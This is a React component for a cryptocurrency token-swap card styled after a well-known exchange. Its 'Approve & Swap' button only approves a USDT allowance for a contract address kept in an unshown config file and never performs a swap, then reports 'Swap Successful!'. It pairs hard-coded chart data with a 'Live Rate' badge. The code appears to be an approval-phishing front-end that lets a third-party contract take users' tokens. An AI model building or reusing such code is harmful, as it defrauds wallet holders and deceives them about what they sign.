import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONFIG, USDT_ABI, TOKEN_LIST, fetchLivePrices } from '../config';
import TokenModal from './TokenModal';
import { AreaChart, Area, Tooltip, ResponsiveContainer } from 'recharts';

const mockChartData = [
  { time: '10:00', price: 3400 }, { time: '11:00', price: 3420 },
  { time: '12:00', price: 3380 }, { time: '13:00', price: 3450 },
  { time: '14:00', price: 3480 }, { time: '15:00', price: 3440 },
  { time: '16:00', price: 3500 }, { time: '17:00', price: 3520 },
];

export default function SwapCard({ walletAddress, provider }) {
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [usdtBalance, setUsdtBalance] = useState('0.00');
  const [status, setStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalTarget, setModalTarget] = useState('from'); 
  
  const [fromToken, setFromToken] = useState(TOKEN_LIST[0]); // USDT
  const [toToken, setToToken] = useState(TOKEN_LIST[1]); // ETH

  const [livePrices, setLivePrices] = useState({});

  const updatePrices = async () => {
    const prices = await fetchLivePrices();
    if (Object.keys(prices).length > 0) {
      setLivePrices(prices);
    }
  };

  useEffect(() => {
    if (walletAddress && provider) loadBalance();
    updatePrices();
    const interval = setInterval(updatePrices, 30000); 
    return () => clearInterval(interval);
  }, [walletAddress, provider]);

  useEffect(() => {
    if (fromAmount) calculateOutput(fromAmount);
  }, [livePrices, fromToken, toToken]);

  const loadBalance = async () => {
    try {
      const signer = provider.getSigner();
      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
      const balance = await usdtContract.balanceOf(walletAddress);
      const decimals = await usdtContract.decimals();
      setUsdtBalance(parseFloat(ethers.utils.formatUnits(balance, decimals)).toLocaleString());
    } catch (error) { console.error(error); }
  };

  const calculateOutput = (value) => {
    setFromAmount(value);
    const val = parseFloat(value) || 0;
    if (val === 0) { setToAmount(''); return; }

    const fromPrice = livePrices[fromToken.symbol] || 1;
    const toPrice = livePrices[toToken.symbol] || 1;

    const output = (val * fromPrice) / toPrice;
    setToAmount(output.toFixed(6));
  };

  const handleMaxClick = () => {
    if (usdtBalance !== '0.00') calculateOutput(usdtBalance.replace(/,/g, ''));
  };

  const switchTokens = () => {
    setFromToken(toToken);
    setToToken(fromToken);
    setFromAmount('');
    setToAmount('');
  };

  const openTokenModal = (target) => {
    setModalTarget(target);
    setIsModalOpen(true);
  };

  const handleSelectToken = (selectedToken) => {
    if (modalTarget === 'from') setFromToken(selectedToken);
    else setToToken(selectedToken);
    if (fromAmount) setTimeout(() => calculateOutput(fromAmount), 100);
  };

  const executeSwap = async () => {
    if (!walletAddress) { setStatus({ type: 'error', msg: 'Please connect your wallet first!' }); return; }
    if (!fromAmount || fromAmount <= 0) { setStatus({ type: 'error', msg: 'Please enter a valid amount.' }); return; }

    try {
      setIsLoading(true);
      setStatus({ type: 'info', msg: '⏳ Waiting for wallet confirmation...' });
      
      const signer = provider.getSigner();
      const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
      const decimals = await usdtContract.decimals();
      
      // ethers.utils එකේ තියෙන parseUnits පාවිච්චි කරනවා
      const amountWei = ethers.utils.parseUnits(fromAmount, decimals);

      const tx = await usdtContract.approve(CONFIG.contractAddress, amountWei);
      setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting...' });
      await tx.wait();
      setStatus({ type: 'success', msg: '✅ Swap Successful! Tokens approved.' });
      setIsLoading(false);
      setTimeout(() => setStatus(null), 8000);
    } catch (error) {
      setStatus({ type: 'error', msg: '❌ Failed: ' + (error.message || 'User rejected') });
      setIsLoading(false);
    }
  };

  const getConversionRate = () => {
    const fromPrice = livePrices[fromToken.symbol] || 1;
    const toPrice = livePrices[toToken.symbol] || 1;
    return (fromPrice / toPrice).toFixed(6);
  };

  return (
    <>
      <div className="glass-panel w-full max-w-[480px] rounded-2xl p-4 relative">
        
        <div className="h-32 w-full mb-4 bg-[#0D111C] rounded-xl overflow-hidden border border-[#293249]">
           <ResponsiveContainer width="100%" height="100%">
            <AreaChart data={mockChartData}>
              <defs>
                <linearGradient id="colorPrice" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="5%" stopColor="#FF007A" stopOpacity={0.3}/>
                  <stop offset="95%" stopColor="#FF007A" stopOpacity={0}/>
                </linearGradient>
              </defs>
              <Tooltip contentStyle={{ backgroundColor: '#131A2A', border: '1px solid #293249', borderRadius: '8px' }} />
              <Area type="monotone" dataKey="price" stroke="#FF007A" strokeWidth={2} fillOpacity={1} fill="url(#colorPrice)" />
            </AreaChart>
          </ResponsiveContainer>
        </div>

        <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mb-1">
          <div className="flex justify-between text-sm text-gray-400 mb-2">
            <span>Sell</span>
            <span className="cursor-pointer hover:text-white" onClick={handleMaxClick}>
              Balance: <span>{fromToken.symbol === 'USDT' ? usdtBalance : '0.00'}</span>
            </span>
          </div>
          <div className="flex items-center justify-between gap-4">
            <input type="number" placeholder="0" className="swap-input" value={fromAmount} onChange={(e) => calculateOutput(e.target.value)} />
            <button onClick={() => openTokenModal('from')} className="token-btn flex items-center space-x-2 px-3 py-1.5 rounded-full">
              <img src={fromToken.icon} className="w-6 h-6" alt={fromToken.symbol} />
              <span className="font-bold text-lg">{fromToken.symbol}</span>
              <span className="text-xs ml-1">▼</span>
            </button>
          </div>
        </div>

        <div className="flex justify-center -my-2 relative z-10">
          <button onClick={switchTokens} className="w-8 h-8 rounded-lg bg-[#131A2A] border border-[#293249] flex items-center justify-center hover:bg-[#293249] cursor-pointer transition">
            <span className="text-gray-400">↓</span>
          </button>
        </div>

        <div className="bg-[#0D111C] rounded-xl p-4 border border-transparent hover:border-[#293249] transition-colors mt-1 mb-4">
          <div className="flex justify-between text-sm text-gray-400 mb-2">
            <span>Buy</span>
            <span>Balance: 0.00</span>
          </div>
          <div className="flex items-center justify-between gap-4">
            <input type="text" placeholder="0" readOnly className="swap-input text-gray-500" value={toAmount} />
            <button onClick={() => openTokenModal('to')} className="token-btn flex items-center space-x-2 px-3 py-1.5 rounded-full">
              <img src={toToken.icon} className="w-6 h-6" alt={toToken.symbol} />
              <span className="font-bold text-lg">{toToken.symbol}</span>
              <span className="text-xs ml-1">▼</span>
            </button>
          </div>
        </div>

        <div className="flex justify-between text-xs text-gray-400 px-2 mb-4">
          <span>1 {fromToken.symbol} ≈ {getConversionRate()} {toToken.symbol}</span>
          <span className="text-green-400 flex items-center">
            <span className="w-1.5 h-1.5 rounded-full bg-green-400 mr-1 animate-pulse"></span> Live Rate
          </span>
        </div>

        <button onClick={executeSwap} disabled={isLoading} className="w-full bg-brand-500 hover:bg-brand-600 text-white font-bold py-4 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-2">
          <span>{isLoading ? 'Processing...' : 'Approve & Swap'}</span>
        </button>

        {status && (
          <div className={`mt-3 text-xs text-center p-2 rounded-lg ${status.type === 'error' ? 'text-red-400 bg-red-500/10 border border-red-500/20' : status.type === 'success' ? 'text-green-400 bg-green-500/10 border border-green-500/20' : 'text-brand-500 bg-brand-500/10 border border-brand-500/20'}`}>
            {status.msg}
          </div>
        )}
      </div>
      <TokenModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} onSelect={handleSelectToken} livePrices={livePrices} />
    </>
  );
}